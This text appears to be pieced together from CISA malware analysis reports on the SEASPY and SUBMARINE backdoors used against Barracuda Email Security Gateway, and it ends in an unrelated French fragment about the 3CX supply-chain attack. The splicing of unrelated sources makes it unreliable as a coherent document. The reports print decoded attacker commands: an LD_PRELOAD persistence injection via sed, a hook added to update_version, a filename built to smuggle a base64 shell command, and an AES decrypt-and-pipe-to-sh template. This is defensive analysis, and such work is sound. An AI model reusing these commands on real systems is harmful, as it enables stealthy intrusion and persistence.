&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA obtained two SEASPY malware samples. The malware was used by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting versions 5.1.3.001-9.2.0.006 of Barracuda Email Security Gateway (ESG).&lt;br /&gt;&lt;br /&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 64-bit ELF file that has been identified as a "SEASPY" malware variant installed as a system service. The sample is a persistent backdoor that masquerades as a legitimate Barracuda Networks service. The malware is designed to listen to commands received from the Threat Actor’s (TA) Command-and-Control (C2) through Transmission Control Protocol (TCP) packets. When executed, the malware uses libpcap sniffer to monitor traffic for a magic packet on TCP port 25 (SMTP) and TCP port 587. It checks the network packet captured for a hard-coded string "oXmp". Note: This hard-coded string may change for other SEASPY variants. When the right sequence of packet is captured, it establishes a TCP reverse shell to the TA's C2 server for further exploitation. This allows the TA to execute arbitrary commands on the compromised system.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The malware is based on an open-source backdoor program named "cd00r" and it is executed using the parameter below:&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin argument—&lt;br /&gt;&lt;br /&gt;
			Usage: "./BarracudaMailService &amp;lt;Network-Interface&amp;gt;"&lt;br /&gt;&lt;br /&gt;
			Sample: "./&amp;lt;malware&amp;gt; eth0"&lt;br /&gt;&lt;br /&gt;
			--End argument—&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 64-bit ELF file that has been identified as a "SEASPY" malware variant installed as a system service. This sample has the sample malicious capabilities as BarracudaMailService.2 (5d6cba7909980a7b424b133fbac634ac). The only difference between the binaries is located in the function named "start_pcap_listener". In the function "start_pcap_listener" both binaries call a function named "reverse shell" to start the reverse shell functionality of the malware. The difference is that BarracudaMailService.1 (32ffe48d1a8ced49c53033eb65eff6f3) jumps directly to the set of instructions that start the reverse shell, as opposed to BarracudaMailService.2 (5d6cba7909980a7b424b133fbac634ac), which contains an extra set of instructions before jumping to the instructions that start the reverse shell.&lt;/p&gt;
&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA obtained seven malware samples related to a novel backdoor CISA has named SUBMARINE. The malware was used by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting certain versions 5.1.3.001 - 9.2.0.006 of Barracuda Email Security Gateway (ESG).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			SUBMARINE is a novel persistent backdoor that lives in a Structured Query Language (SQL) database on the ESG appliance. SUBMARINE comprises multiple artifacts that, in a multi-step process, enable execution with root privileges, persistence, command and control, and cleanup. In addition to SUBMARINE, CISA obtained associated Multipurpose Internet Mail Extensions (MIME) attachment files from the victim. These files contained the contents of the compromised SQL database, which included sensitive information.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			For information about related malware, specifically information on the initial exploit payload and other backdoors, see CISA Alert: &lt;a href="https://www.cisa.gov/news-events/alerts/2023/07/28/cisa-releases-malware-analysis-reports-barracuda-backdoors"&gt;CISA Releases Malware Analysis Reports on Barracuda Backdoors&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;The file 'config.TRG' is a SUBMARINE artifact. The presence of the filename, 'config.TRG' does not indicate that the ESG is infected. Instead, it is the actual contents of the file that determine whether it is infected or not. The contents of 'config.TRG' is contained within the SQL database file called 'config.snapshot' and the MIME attachments. Presence of the contents of the file 'config.TRG' within the SQL database is indicative of an infection of SUBMARINE.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The file contains a malicious SQL trigger called ‘cuda_trigger’ (Figure 1). This SQL trigger is set to run as root on the local host before a row is deleted from the database. After the trigger parameters are met, two actions occur. First a compressed, base64 encoded blob containing 2 files is written into a file called ‘r’ in the ‘/var/tmp’ directory (Figure 2). Second, a base64 encoded command is executed (Figure 3).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin Base64 Decoded Command--&lt;br /&gt;&lt;br /&gt;
			cat /var/tmp/r | base64 -d -i | tar -zx -C /var/tmp&lt;br /&gt;&lt;br /&gt;
			nohup bash /var/tmp/run.sh &amp;lt;BSMTP_ID&amp;gt; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&lt;br /&gt;&lt;br /&gt;
			rm -f /root/machine\` *chmod +x /root/mac*&lt;br /&gt;&lt;br /&gt;
			sh /root/mach*\`*&lt;br /&gt;&lt;br /&gt;
			--End Base64 Decoded Command--&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The commands will decode the base64 encoded string and execute the decoded result as a shell command. The commands will pass the contents of the file 'r' to be decoded then decompressed with the 'tar' command. Then, the file 'run.sh' executes with the 'nohup' parameter. The 'nohup' parameter allows the process launched on the shell to continue executing even if the shell is closed. The 'BSMTP_ID' is passed and all errors redirected and discarded to the '/dev/null' directory. Lastly, the contents of the '/root/machine' directory will be removed, permissions are set to executable, and shell scripts containing a name with the string 'mach*' in the root directory are executed.&lt;/p&gt;

&lt;p&gt;The file 'machineecho -n Y2htb2QgK3ggL3Jvb3QvbWFjKgpzaCAvcm9vdC9tYWNoKlxgKgoK _ base64 -d _sh`_' is a SUBMARINE artifact. The file is a shell script identified in the '/root' directory and contains base64 encoded commands. The name of the file is designed to exploit a vulnerability on the target environment where the base64 string within the file name will be executed on the Linux shell.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin Base64 Decoded Name/Command--&lt;br /&gt;&lt;br /&gt;
			chmod +x /root/mac*&lt;br /&gt;&lt;br /&gt;
			sh /root/mach*\`*&lt;br /&gt;&lt;br /&gt;
			--End Base64 Decoded Name/Command--&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The above commands will change the permissions of the directory, '/root/mac*', to executable.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The file contains a series of operations, such as decoding a base64 encoded string and executing the decoded result as a shell command. The decoded base64 string represents a series of commands that will be executed by the shell.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			~Begin Base64 Decoded Command~&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			cat /var/tmp/r | base64 -d -i | tar -zx -C /var/tmp&lt;br /&gt;&lt;br /&gt;
			nohup bash /var/tmp/run.sh &amp;lt;REDACTED BSMTP_ID&amp;gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&lt;br /&gt;&lt;br /&gt;
			rm -f /root/machine\`*&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			~End Base64 Decoded Command~&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			This command is identical to the decoded base64 commands found in the SQL trigger identified in the file 'config.snapshot'.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;The file 'run.sh' is a SUBMARINE loader. The file is a shell script located at within the archive 'r' in the '/var/tmp' directory. The purpose of 'run.sh' is to perform a combination of file manipulation, script generation and execution (Figure 4). There are 4 variables within 'run.sh':&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin Variable List--&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			B1=$1&lt;br /&gt;&lt;br /&gt;
			F="/boot/os_tools/hw-set"&lt;br /&gt;&lt;br /&gt;
			S="/home/product/code/firmware/current/sbin/smtpctl"&lt;br /&gt;&lt;br /&gt;
			A="/boot/os_tools/libutil.so"&lt;br /&gt;&lt;br /&gt;
			B=`echo -n "sed -i \"s|exec|BSMTP_ID=$B1 LD_PRELOAD=$A exec|g\" $S"|base64 -w0`&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--End Variable List--&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The script begins by moving SUBMARINE from the '/var/tmp/' directory to the '/boot/os_tools/' directory for persistence.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The variable "B" is declared as a 'sed' command that replaces all occurrences of the string 'exec' with `BSMTP_ID=$1 LD_PRELOAD=/boot/os_tools/libutil.so exec /home/product/code/firmware/current/sbin/smtpctl'. This 'sed' command is then base64 encoded.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			A new file called 'hw-set' is created in the '/boot/os_tools/' directory. A line is appended to the 'smtpctl' file which checks for the string 'LD_PRELOAD'. If the string is not found, the base64 encoded string stored in variable "B" is decoded and executed as a shell command and 'smtpctl' is restarted.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The 'chmod' command is used to set executable permissions for 'hw-set'.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The 'sed' command is used with a '-i' flag to modify the file 'update_version' within the '/boot/os_tools/' directory with an appended string to line 44. The appended string, "system('/boot/os_tools/hw-set 2&amp;gt;&amp;amp;1 &amp;gt;/dev/null &amp;amp;');", will run the file 'hw-set' in the background and redirect both output and errors to 'dev/null' whenever the file 'update_version' is executed.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The file 'hw-set' is executed and the 'sed' command with the '-i' flag is used to insert the string 'sleep 2m' on line 1 to set a sleep duration of 2 minutes.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			Finally, all files and directories within '/var/tmp/' directory are removed.&lt;/p&gt;

&lt;p&gt;The file 'hw-set' is a SUBMARINE artifact. The file is a shell script located in the '/boot/os_tools/' directory and contains shell commands as well as a base64 encoded string (Figure 5). The shell script is set to sleep for 2 minutes prior to execution. The 'grep' command checks if the string 'LD_PRELOAD' is contained within the 'smtpctl' file located at '/home/product/code/firmware/current/sbin/'. The exclamation point (!) prepending the script is used to check for success or failure of the 'grep' command. If the string 'LD_PRELOAD' is not identified, a base64 encoded 'sed' command is used to modify the 'smtpctl' file (Figure 6).&lt;/p&gt;

&lt;p&gt;The file 'smtpctl' is a SUBMARINE loader. The file is a maliciously modified shell script used to remove mail files in 2 directories as well as load SUBMARINE as a shared library for the Batched Simple Mail Transfer Protocol (BSMTP) daemon.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			~Begin File Removal Commands~&lt;br /&gt;&lt;br /&gt;
			rm -f /mail/scan/body*&lt;br /&gt;&lt;br /&gt;

			~End File Removal Commands~&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			Appended malicious code at the bottom of 'smtpctl.sh' sets the BSMTP_ID and SUBMARINE is preloaded as a shared library from the '/boot/os_tools' directory. It then executes the BSMTP daemon. If the BSMTPD_PID variable is set, debug mode is enabled. If the BSMTPD_PID variable is not set, execution continues without enabling debug mode. Additionally, any instances of the string 'reload' in the command are replaced with 'restart' and all errors are redirected to '/dev/null' (Figure 7).&lt;/p&gt;

&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;The file 'libutil.so' is the SUBMARINE payload. 'libutil.so' is preloaded into the BSMTP daemon, the Linux executable responsible for receiving emails, and processing Simple Mail Transfer Protocol (SMTP) reply messages. Linux Shared Object Preloading is analogous to Dynamic-Link Library (DLL) side loading and DLL injection in the Windows OS.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			This file is preloaded using the 'LD_PRELOAD' parameter, applied to 'bsmtpd', the BSMTP daemon executable. The preload parameter is added to two configuration files, files that control the behavior of 'bsmtpd.' When the configuration files restart the daemon, 'libutil.so' is loaded into its process memory, giving it the same privileges and access as 'bsmtpd.'&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The malware obtains the BSMTP_ID environment variable from the infected system. The BSMTP_ID has the capacity to be used as a port for malicious traffic. (Figure 8). The process this shared object file is running in, 'bsmtpd', is duplicated and launched using the 'fork' Linux function (Figure 9). The malware opens a connection to 127.0.0.1 on the victim machine it is running on (Figure 10). The 'recv' function is called after the connection is opened, showing that the malware has the capacity to obtain information from the context/environment its executed on.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			Figure 11, Pane 1, shows configuration settings for the BSMTP daemon, that allows any email traffic for the address range of 127/8 and multiple actions including 'ehlo.' Pane 2 shows the malware intaking data, and loading the 'ehlo' action into memory.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			Figure 12, Pane 1, shows the malware, in conjunction with 'snprintf_chk', printing the string 'echo -n '%s' | base64 -d | openssl aes-256-cbc -d -K 66833b26%d -iv 69822b6c%d 2&amp;gt;/dev/null | sh', to the Linux shell. The string is a command that accepts input '%s', decodes it with Base64, decrypts it with AES, pipes errors to std_out and executes it on the target with the 'sh' bash command and 'system' Linux function. Lastly, the malware has the capacity to print the SMTP string, '250-mail2.eccentric.duck Hello %s [%s], pleased to meet you' . Therefore, given this information, the malware has the capacity to accept encoded and encrypted inputs from 'bsmtpd', execute them, and print a message.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;

L’impact est direct puisque l’attaquant à la main sur l’ensemble des machines dont la mise à jour a été faite.&lt;/p&gt;&lt;p&gt;Dans notre cas, c’est la dll ffmpeg.dll qui va être installée.&lt;/p&gt;&lt;p&gt;Ensuite comme l’explique Volexity, la dll télécharge après son chargement un fichier hosté sur github qui est encodé en base64 et chiffré en AES.

En effet, au vu du nombre d’utilisateurs de 3CX (12 millions), l’attaquant a cette technique de pêche au chalut, va devoir trier. Pour cela, il se base sur les informations remontées sur le C2 dans un fichier json ainsi que la GUID de la machine qui passe dans les headers HTTPs. Si la machine l’intéresse, il va maintenir le C2.&lt;/p&gt;&lt;p&gt;Autre impact fort, mis en avant par Volexity, est un chargeur de shellcode. Ce qui veut dire qu’une fois, le malware exécuté, il peut charger ce qu’il veut comme code. Et surtout faire cela uniquement en mémoire.
